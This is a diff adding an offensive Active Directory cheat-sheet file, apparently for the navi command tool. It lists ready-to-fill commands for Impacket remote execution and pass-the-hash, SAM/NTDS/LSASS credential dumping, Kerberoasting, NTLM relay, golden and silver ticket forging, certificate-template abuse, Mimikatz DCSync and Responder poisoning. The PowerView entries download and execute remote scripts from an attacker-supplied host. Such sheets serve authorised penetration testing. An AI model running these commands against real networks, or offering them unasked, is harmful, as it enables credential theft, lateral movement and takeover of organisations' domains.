@@ -1,0 +1,494 @@
+% ad, activedirectory, windows, impacket
+
+; ============================================
+; IMPACKET - PSEXEC
+; ============================================
+
+# PSExec - Execute command with credentials
+impacket-psexec $AD_TARGET:<password>@$IP
+
+# PSExec - Execute command with hash (Pass-the-Hash)
+impacket-psexec -hashes <lmhash>:<nthash> $AD_TARGET@$IP
+
+# PSExec - Execute specific command
+impacket-psexec $AD_TARGET:<password>@$IP <command>
+
+# PSExec - With target-ip option
+impacket-psexec $AD_TARGET:<password>@$HOSTNAME -target-ip $IP
+
+# PSExec - Upload and execute file
+impacket-psexec $AD_TARGET:<password>@$IP -file <local_file>
+
+# PSExec - Kerberos authentication
+impacket-psexec -k -no-pass $AD_TARGET@$HOSTNAME
+
+$ command: echo -e "whoami\nipconfig /all\nnet user\nnet group /domain"
+$ local_file: echo "payload.exe"
+$ lmhash: echo "aad3b435b51404eeaad3b435b51404ee"
+$ nthash: echo "8846f7eaee8fb117ad06bdd830b7586c"
+
+; ============================================
+; IMPACKET - SMBEXEC
+; ============================================
+
+# SMBExec - Execute command with credentials
+impacket-smbexec $AD_TARGET:<password>@$IP
+
+# SMBExec - Execute with hash
+impacket-smbexec -hashes <lmhash>:<nthash> $AD_TARGET@$IP
+
+# SMBExec - With share selection
+impacket-smbexec -share <share_name> $AD_TARGET:<password>@$IP
+
+# SMBExec - Kerberos authentication
+impacket-smbexec -k -no-pass $AD_TARGET@$HOSTNAME
+
+# SMBExec - Execute specific command
+impacket-smbexec $AD_TARGET:<password>@$IP <command>
+
+$ share_name: echo -e "C$\nADMIN$\nIPC$"
+
+; ============================================
+; IMPACKET - WMIEXEC
+; ============================================
+
+# WMIExec - Execute command with credentials
+impacket-wmiexec $AD_TARGET:<password>@$IP
+
+# WMIExec - Execute with hash
+impacket-wmiexec -hashes <lmhash>:<nthash> $AD_TARGET@$IP
+
+# WMIExec - Silent mode (no output)
+impacket-wmiexec -silentcommand $AD_TARGET:<password>@$IP <command>
+
+# WMIExec - Kerberos authentication
+impacket-wmiexec -k -no-pass $AD_TARGET@$HOSTNAME
+
+# WMIExec - With specific namespace
+impacket-wmiexec -namespace <namespace> $AD_TARGET:<password>@$IP
+
+$ namespace: echo -e "root\\cimv2\nroot\\default"
+
+; ============================================
+; IMPACKET - ATEXEC
+; ============================================
+
+# ATExec - Execute command via Task Scheduler
+impacket-atexec $AD_TARGET:<password>@$IP <command>
+
+# ATExec - Execute with hash
+impacket-atexec -hashes <lmhash>:<nthash> $AD_TARGET@$IP <command>
+
+# ATExec - Kerberos authentication
+impacket-atexec -k -no-pass $AD_TARGET@$HOSTNAME <command>
+
+; ============================================
+; IMPACKET - SECRETSDUMP
+; ============================================
+
+# SecretsDump - Dump SAM/SYSTEM/SECURITY hashes
+impacket-secretsdump $AD_TARGET:<password>@$IP
+
+# SecretsDump - Dump with hash
+impacket-secretsdump -hashes <lmhash>:<nthash> $AD_TARGET@$IP
+
+# SecretsDump - Dump NTDS.dit
+impacket-secretsdump -just-dc $AD_TARGET:<password>@$IP
+
+# SecretsDump - Dump NTDS with history
+impacket-secretsdump -just-dc -history $AD_TARGET:<password>@$IP
+
+# SecretsDump - Dump only NTLM hashes
+impacket-secretsdump -just-dc-ntlm $AD_TARGET:<password>@$IP
+
+# SecretsDump - Dump from specific user
+impacket-secretsdump -just-dc-user <target_user> $AD_TARGET:<password>@$IP
+
+# SecretsDump - Output to file
+impacket-secretsdump $AD_TARGET:<password>@$IP -outputfile <output_file>
+
+# SecretsDump - Kerberos authentication
+impacket-secretsdump -k -no-pass $AD_TARGET@$HOSTNAME
+
+# SecretsDump - Use VSS (Volume Shadow Copy)
+impacket-secretsdump -use-vss $AD_TARGET:<password>@$IP
+
+# SecretsDump - Local file parsing
+impacket-secretsdump -sam <sam_file> -system <system_file> -security <security_file> LOCAL
+
+$ target_user: echo "Administrator"
+$ sam_file: echo "sam.save"
+$ system_file: echo "system.save"
+$ security_file: echo "security.save"
+
+; ============================================
+; IMPACKET - GETUSERSPNS (Kerberoasting)
+; ============================================
+
+# GetUserSPNs - List SPNs
+impacket-GetUserSPNs $DOMAIN/$AD_USER:<password>
+
+# GetUserSPNs - Request TGS tickets
+impacket-GetUserSPNs $DOMAIN/$AD_USER:<password> -request
+
+# GetUserSPNs - Save tickets to file
+impacket-GetUserSPNs $DOMAIN/$AD_USER:<password> -request -outputfile <output_file>
+
+# GetUserSPNs - DC IP specification
+impacket-GetUserSPNs $DOMAIN/$AD_USER:<password> -dc-ip $IP -request
+
+# GetUserSPNs - With hash
+impacket-GetUserSPNs -hashes <lmhash>:<nthash> $DOMAIN/$AD_USER -request
+
+# GetUserSPNs - Kerberos authentication
+impacket-GetUserSPNs -k -no-pass $DOMAIN/$AD_USER -request
+
+$ AD_USER: echo -e "user1\nadministrator\nsvc_account"
+
+; ============================================
+; IMPACKET - GETNPUSERS (ASREPRoasting)
+; ============================================
+
+# GetNPUsers - ASREPRoasting all users
+impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -request
+
+# GetNPUsers - Specific user
+impacket-GetNPUsers $DOMAIN/$AD_USER -dc-ip $IP -no-pass
+
+# GetNPUsers - From user list
+impacket-GetNPUsers $DOMAIN/ -usersfile <user_list> -dc-ip $IP
+
+# GetNPUsers - Output format for hashcat
+impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -format hashcat -outputfile <output_file>
+
+# GetNPUsers - With credentials
+impacket-GetNPUsers $DOMAIN/$AD_USER:<password> -dc-ip $IP -request
+
+$ user_list: echo "users.txt"
+
+; ============================================
+; IMPACKET - LOOKUPSID
+; ============================================
+
+# LookupSID - Enumerate domain users/groups
+impacket-lookupsid $AD_TARGET:<password>@$IP
+
+# LookupSID - With specific SID
+impacket-lookupsid $AD_TARGET:<password>@$IP <max_rid>
+
+# LookupSID - With hash
+impacket-lookupsid -hashes <lmhash>:<nthash> $AD_TARGET@$IP
+
+$ max_rid: echo -e "5000\n10000\n20000"
+
+; ============================================
+; IMPACKET - SAMRDUMP
+; ============================================
+
+# SamrDump - Enumerate users via SAM
+impacket-samrdump $AD_TARGET:<password>@$IP
+
+# SamrDump - With hash
+impacket-samrdump -hashes <lmhash>:<nthash> $AD_TARGET@$IP
+
+; ============================================
+; IMPACKET - RPCDUMP
+; ============================================
+
+# RPCDump - Enumerate RPC endpoints
+impacket-rpcdump $IP
+
+# RPCDump - With authentication
+impacket-rpcdump $AD_TARGET:<password>@$IP
+
+# RPCDump - Specific port
+impacket-rpcdump -port <port> $IP
+
+$ port: echo -e "135\n593"
+
+; ============================================
+; IMPACKET - REG
+; ============================================
+
+# Reg - Query registry key
+impacket-reg $AD_TARGET:<password>@$IP query -keyName <key_name>
+
+# Reg - Save registry hive
+impacket-reg $AD_TARGET:<password>@$IP backup -keyName <hive_name>
+
+# Reg - With hash
+impacket-reg -hashes <lmhash>:<nthash> $AD_TARGET@$IP query -keyName <key_name>
+
+$ key_name: echo -e "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\nHKLM\\SYSTEM\\CurrentControlSet\\Services"
+$ hive_name: echo -e "HKLM\\SAM\nHKLM\\SYSTEM\nHKLM\\SECURITY"
+
+; ============================================
+; IMPACKET - SMBCLIENT
+; ============================================
+
+# SMBClient - List shares
+impacket-smbclient $AD_TARGET:<password>@$IP
+
+# SMBClient - With hash
+impacket-smbclient -hashes <lmhash>:<nthash> $AD_TARGET@$IP
+
+# SMBClient - Kerberos authentication
+impacket-smbclient -k -no-pass $AD_TARGET@$HOSTNAME
+
+; ============================================
+; IMPACKET - GETARCH
+; ============================================
+
+# GetArch - Get target architecture
+impacket-getArch $AD_TARGET:<password>@$IP
+
+# GetArch - With hash
+impacket-getArch -hashes <lmhash>:<nthash> $AD_TARGET@$IP
+
+; ============================================
+; IMPACKET - ADDCOMPUTER
+; ============================================
+
+# AddComputer - Add machine account
+impacket-addcomputer -computer-name <computer_name> -computer-pass <computer_pass> $DOMAIN/$AD_USER:<password> -dc-ip $IP
+
+# AddComputer - With hash
+impacket-addcomputer -computer-name <computer_name> -computer-pass <computer_pass> -hashes <lmhash>:<nthash> $DOMAIN/$AD_USER -dc-ip $IP
+
+$ computer_name: echo "EVILPC$"
+$ computer_pass: echo "Password123!"
+
+; ============================================
+; IMPACKET - NTLMRELAYX
+; ============================================
+
+# NTLMRelayX - Basic relay
+impacket-ntlmrelayx -t $IP -smb2support
+
+# NTLMRelayX - Relay with command execution
+impacket-ntlmrelayx -t $IP -smb2support -c <command>
+
+# NTLMRelayX - Relay to multiple targets
+impacket-ntlmrelayx -tf <target_file> -smb2support
+
+# NTLMRelayX - Dump SAM
+impacket-ntlmrelayx -t $IP -smb2support --dump-sam
+
+# NTLMRelayX - Dump LSASS
+impacket-ntlmrelayx -t $IP -smb2support --dump-lsass
+
+# NTLMRelayX - SOCKS proxy
+impacket-ntlmrelayx -tf <target_file> -smb2support -socks
+
+# NTLMRelayX - Escalate to DA
+impacket-ntlmrelayx -t ldap://$IP --escalate-user <username>
+
+$ target_file: echo "targets.txt"
+
+; ============================================
+; IMPACKET - TICKETER (Golden/Silver Tickets)
+; ============================================
+
+# Ticketer - Golden ticket
+impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain $DOMAIN <username>
+
+# Ticketer - Silver ticket for CIFS
+impacket-ticketer -nthash <service_hash> -domain-sid <domain_sid> -domain $DOMAIN -spn cifs/$HOSTNAME <username>
+
+# Ticketer - Specify user ID
+impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain $DOMAIN -user-id <rid> <username>
+
+# Ticketer - Extra SIDs (Enterprise Admins)
+impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain $DOMAIN -extra-sid <extra_sid> <username>
+
+$ krbtgt_hash: echo "ff46a9d8bd66c6efd77603da26796f35"
+$ service_hash: echo "8846f7eaee8fb117ad06bdd830b7586c"
+$ domain_sid: echo "S-1-5-21-1234567890-1234567890-1234567890"
+$ rid: echo -e "500\n1000"
+$ extra_sid: echo "S-1-5-21-1234567890-1234567890-1234567890-519"
+$ username: echo "Administrator"
+
+; ============================================
+; BLOODHOUND-PYTHON
+; ============================================
+
+# BloodHound - Collect all data
+bloodhound-python -d $DOMAIN -u $AD_USER -p <password> -c all -ns $IP
+
+# BloodHound - Specific collection methods
+bloodhound-python -d $DOMAIN -u $AD_USER -p <password> -c <collection_method> -ns $IP
+
+# BloodHound - With hash
+bloodhound-python -d $DOMAIN -u $AD_USER --hashes <lmhash>:<nthash> -c all -ns $IP
+
+# BloodHound - Kerberos authentication
+bloodhound-python -d $DOMAIN -u $AD_USER -k -c all -ns $IP
+
+# BloodHound - Output to specific directory
+bloodhound-python -d $DOMAIN -u $AD_USER -p <password> -c all -ns $IP --zip
+
+$ collection_method: echo -e "DCOnly\nGroup,LocalAdmin,Session,Trusts\nACL,Container,ObjectProps"
+
+; ============================================
+; LDAPDOMAINDUMP
+; ============================================
+
+# LDAPDomainDump - Basic dump
+ldapdomaindump -u '$DOMAIN\\$AD_USER' -p <password> $IP
+
+# LDAPDomainDump - Output to directory
+ldapdomaindump -u '$DOMAIN\\$AD_USER' -p <password> -o <output_dir> $IP
+
+# LDAPDomainDump - Resolve names
+ldapdomaindump -u '$DOMAIN\\$AD_USER' -p <password> --resolve $IP
+
+# LDAPDomainDump - No HTML output
+ldapdomaindump -u '$DOMAIN\\$AD_USER' -p <password> --no-html $IP
+
+# LDAPDomainDump - No JSON output
+ldapdomaindump -u '$DOMAIN\\$AD_USER' -p <password> --no-json $IP
+
+# LDAPDomainDump - No GREP output
+ldapdomaindump -u '$DOMAIN\\$AD_USER' -p <password> --no-grep $IP
+
+$ output_dir: echo "ldap_dump"
+
+; ============================================
+; CERTIPY (AD Certificate Services)
+; ============================================
+
+# Certipy - Find vulnerable templates
+certipy find -u $AD_USER@$DOMAIN -p <password> -dc-ip $IP
+
+# Certipy - Request certificate
+certipy req -u $AD_USER@$DOMAIN -p <password> -ca <ca_name> -template <template_name> -dc-ip $IP
+
+# Certipy - Authenticate with certificate
+certipy auth -pfx <pfx_file> -dc-ip $IP
+
+# Certipy - Find with hash
+certipy find -u $AD_USER@$DOMAIN -hashes <lmhash>:<nthash> -dc-ip $IP
+
+# Certipy - ESC1 exploitation
+certipy req -u $AD_USER@$DOMAIN -p <password> -ca <ca_name> -template <template_name> -upn administrator@$DOMAIN -dc-ip $IP
+
+# Certipy - ESC8 (NTLM Relay to ADCS)
+certipy relay -target http://<ca_server>/certsrv/certfnsh.asp
+
+$ ca_name: echo "ca-server-CA"
+$ template_name: echo -e "User\nMachine\nVulnTemplate"
+$ pfx_file: echo "administrator.pfx"
+$ ca_server: echo "ca-server.domain.local"
+
+; ============================================
+; CRACKMAPEXEC / NETEXEC (see network-tools.cheat)
+; ============================================
+
+; ============================================
+; RUBEUS (via execute-assembly or similar)
+; ============================================
+
+# Rubeus - Kerberoasting
+execute-assembly /path/to/Rubeus.exe kerberoast /outfile:<output_file>
+
+# Rubeus - ASREPRoasting
+execute-assembly /path/to/Rubeus.exe asreproast /outfile:<output_file>
+
+# Rubeus - Request TGT
+execute-assembly /path/to/Rubeus.exe asktgt /user:<username> /password:<password> /domain:$DOMAIN
+
+# Rubeus - Pass-the-Ticket
+execute-assembly /path/to/Rubeus.exe ptt /ticket:<ticket_file>
+
+# Rubeus - Dump tickets
+execute-assembly /path/to/Rubeus.exe dump
+
+# Rubeus - Monitor for TGTs (4624 logons)
+execute-assembly /path/to/Rubeus.exe monitor /interval:<seconds>
+
+$ ticket_file: echo "ticket.kirbi"
+$ seconds: echo -e "30\n60\n300"
+
+; ============================================
+; MIMIKATZ (Common Commands)
+; ============================================
+
+# Mimikatz - Dump credentials (sekurlsa::logonpasswords)
+mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# Mimikatz - Dump SAM
+mimikatz "privilege::debug" "lsadump::sam" "exit"
+
+# Mimikatz - Dump LSA secrets
+mimikatz "privilege::debug" "lsadump::secrets" "exit"
+
+# Mimikatz - DCSync attack
+mimikatz "lsadump::dcsync /user:$DOMAIN\\<target_user>" "exit"
+
+# Mimikatz - Golden ticket
+mimikatz "kerberos::golden /user:<username> /domain:$DOMAIN /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt" "exit"
+
+# Mimikatz - Pass-the-Hash
+mimikatz "sekurlsa::pth /user:<username> /domain:$DOMAIN /ntlm:<nthash>" "exit"
+
+; ============================================
+; EVIL-WINRM
+; ============================================
+
+# Evil-WinRM - Connect with credentials
+evil-winrm -i $IP -u $AD_USER -p <password>
+
+# Evil-WinRM - Connect with hash
+evil-winrm -i $IP -u $AD_USER -H <nthash>
+
+# Evil-WinRM - With SSL
+evil-winrm -i $IP -u $AD_USER -p <password> -S
+
+# Evil-WinRM - Specific port
+evil-winrm -i $IP -u $AD_USER -p <password> -P <port>
+
+# Evil-WinRM - Upload scripts directory
+evil-winrm -i $IP -u $AD_USER -p <password> -s <scripts_dir>
+
+# Evil-WinRM - Upload executables directory
+evil-winrm -i $IP -u $AD_USER -p <password> -e <executables_dir>
+
+$ scripts_dir: echo "/opt/scripts"
+$ executables_dir: echo "/opt/executables"
+
+; ============================================
+; POWERVIEW (via PowerShell)
+; ============================================
+
+# PowerView - Get domain info
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://$IP/PowerView.ps1'); Get-Domain"
+
+# PowerView - Get domain users
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://$IP/PowerView.ps1'); Get-DomainUser"
+
+# PowerView - Get domain computers
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://$IP/PowerView.ps1'); Get-DomainComputer"
+
+# PowerView - Find local admin access
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://$IP/PowerView.ps1'); Find-LocalAdminAccess"
+
+# PowerView - Get domain trusts
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://$IP/PowerView.ps1'); Get-DomainTrust"
+
+; ============================================
+; RESPONDER
+; ============================================
+
+# Responder - Basic poisoning
+responder -I <interface>
+
+# Responder - Analyze mode (passive)
+responder -I <interface> -A
+
+# Responder - WPAD rogue proxy
+responder -I <interface> -w
+
+# Responder - Force WPAD authentication
+responder -I <interface> -w -F
+
+$ interface: ip -o link show | awk -F': ' '{print $2}' | grep -v lo
